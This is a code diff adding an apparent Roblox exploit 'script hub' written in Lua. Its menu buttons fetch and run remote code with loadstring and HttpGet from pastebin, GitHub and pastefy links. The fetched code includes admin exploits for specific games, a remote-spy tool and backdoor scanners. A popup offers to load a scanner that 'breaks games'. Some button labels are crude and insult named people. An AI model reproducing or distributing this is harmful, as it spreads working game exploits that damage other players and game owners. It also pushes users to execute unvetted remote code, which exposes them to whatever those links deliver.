@@ -1,0 +1,214 @@
+
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local Alfem = Rayfield:CreateWindow({
+    Name = "Alex is fem hub",
+    LoadingTitle = "Alex is fem hub loading...",
+    LoadingSubtitle = "by Lewdssexploits",
+    ConfigurationSaving = {
+       Enabled = false,
+       FolderName = 1010101010,
+       FileName = "Alex is fem Hub"
+    },
+    Discord = {
+       Enabled = false,
+       Invite = "noinvitelink",
+       RememberJoins = false
+    },
+    KeySystem = true,
+    KeySettings = {
+       Title = "LOCKED U SKID",
+       Subtitle = "private pay me 10 bucks if u want it",
+       Note = "pay me 10 bucks",
+       FileName = "1010101",
+       SaveKey = false,
+       GrabKeyFromSite = true,
+       Key = {"https://pastebin.com/raw/WbybaZai"}
+    }
+})
+
+-- Create a tab and section under the Alfem window
+local MainTab = Alfem:CreateTab("Misc", nil)
+local MainSection = MainTab:CreateSection("Oldvers")
+local Button1 = MainTab:CreateButton({
+    Name = "old ver",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/5V8eFATj"))()
+    end,
+})
+
+-- Prisonlife
+local Maintab1 = Alfem:CreateTab("PL", nil)
+local GameSection = Maintab1:CreateSection("Admin")
+local Button2 = Maintab1:CreateButton({
+    Name = "Tiger admin",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/dalloc2/Roblox/main/TigerAdmin.lua"))()
+    end,
+})
+local Gamesection1 = Maintab1:CreateSection("other")
+local Button3 = Maintab1:CreateButton({
+    Name = "Prisonbreaker",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/QcNge4QY"))()
+    end,
+})
+local Button4 = Maintab1:CreateButton({
+    Name = "Shife hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/DHa0wak3"))()
+    end,
+})
+
+-- Main
+local MainTab2 = Alfem:CreateTab("Main", nil)
+local Section = MainTab2:CreateSection("Infinitespy")
+local Button5 = MainTab2:CreateButton({
+    Name = "Infinite Yield Admin",
+    Callback = function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+    end,
+})
+local Button6 = MainTab2:CreateButton({
+    Name = "Simplespy",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/RS/main/SimpleSpyMobile"))()
+    end,
+})
+local Button7 = MainTab2:CreateButton({
+    Name = "Backdeer scanoor dont use in pl",
+    Callback = function()
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/main.lua"))()
+    end,
+})
+
+-- Brookhaven
+local MainTab3 = Alfem:CreateTab("Brookhaven", nil)
+local Section2 = MainTab3:CreateSection("Idk like scripts bruh")
+local Button8 = MainTab3:CreateButton({
+    Name = "RedzHub brookhaven spanish",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/REDzHUB/main/REDzHUB"))()
+    end,
+})
+
+-- Mm2
+local MainTab4 = Alfem:CreateTab("Murder Mystery 2 hax", nil)
+local Section3 = MainTab4:CreateSection("Some cool sheez")
+local Button9 = MainTab4:CreateButton({
+    Name = "Mm2 Admin panel",
+    Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/e89Mn4Ec'))()
+    end,
+})
+local Button10 = MainTab4:CreateButton({
+    Name = "Mm2 Vynxius",
+    Callback = function()
+        loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
+    end,
+})
+
+-- BLOX FRUITS 
+local MainTab5 = Alfem:CreateTab("BLOXFRUITS", nil)
+local Section4 = MainTab5:CreateSection("Some cool sheez")
+
+local Button11 = MainTab5:CreateButton({
+    Name = "Bloxfruits",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeeScripts/FREEHub/main/Loader", true))()
+    end,
+})
+
+
+-- Prisonlife2
+
+local MainTab6 = Alfem:CreateTab("Script Hub", nil)
+local Section5 = MainTab6:CreateSection("Impact hub")
+local Button12 = MainTab6:CreateButton({
+    Name = "Impact hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/NoobExploits/scripts/main/MainScript.lua"))()
+    end,
+})
+
+local Label = MainTab6:CreateLabel("This script works with PL And Lucky block battlegrounds ")
+
+-- Credits
+
+local MainTab7 = Alfem:CreateTab("Credits", nil)
+
+local Label = MainTab7:CreateLabel("This script was made by lewdssexploits ")
+
+-- Fe stuff
+local MainTab8 = Alfem:CreateTab("Fe scripts", nil)
+local Section6 = MainTab8:CreateSection("fe stuff")
+local Button13 = MainTab8:CreateButton({
+    Name = "Telekenisis",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/07GGb4Dk"))()
+    end,
+})
+local Button14 = MainTab8:CreateButton({
+    Name = "attach script",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/YvJPhFNb"))()
+    end,
+})
+
+-- Main2
+local MainTab9 = Alfem:CreateTab("MAIN2", nil)
+local Section7 = MainTab9:CreateSection("fe stuff")
+local Button15 = MainTab9:CreateButton({
+    Name = "liam flexes his inbred girlfeind gui",
+    Callback = function()
+        local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+        local MainWindow = Library.CreateLib("Lewis's localplayer Gui", "DarkTheme")
+        local LocalTab = MainWindow:NewTab("LocalPlayer")
+        local PlayerSection = LocalTab:NewSection("Player")
+        PlayerSection:NewSlider("Walkspeed", "Adjust the walkspeed of your character", 500, 16, function(s)
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
+        end)
+    end,
+})
+local Button16 = MainTab9:CreateButton({
+    Name = "Backdoor shahoot",
+    Callback = function()
+        local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+        local Alfem = Library.CreateLib("backdoor GUI by lewis", "DarkTheme")
+        local Maintab = Alfem:NewTab("TabName")
+        local Section = Maintab:NewSection("Backdoor scanning and shahoot")
+        Section:NewButton("Beckdeer scanor", "beckdeer scanor", function()
+            loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/main.lua"))()
+        end)
+        Section:NewButton("Lalol", "lalol", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
+        end)
+        Section:NewButton("Frakture", "frakture", function()
+            loadstring(game:HttpGet('https://pastefy.app/edMe7Bwx/raw'))()
+        end)
+    end,
+})
+
+Rayfield:Notify({
+    Title = "Successfully fully loaded alex is fem hub(look in the console for our discord)",
+    Content = "would you like to load a backdoor scanner that lets u execute stuff that breaks games if there is a backdoor",
+    Duration = 14,
+    Image = 4483362458,
+    Actions = { -- Notification Buttons
+       Ignore = {
+          Name = "Yes",
+          Callback = function()
+            loadstring(game:HttpGet('https://pastefy.app/edMe7Bwx/raw'))()
+       end
+    },
+ },
+ })
+ print ("https://discord.gg/RptjzuHJWJ")
+
+
+
+
+print ("why did u skid on a bad script hub tbh like pls dont u wouldnt steal a car")
+print ("aight thanks cuh lemme know what u want in the cord")
+print ("github is the best cus")
+print ("i am mad at github randomly banned")
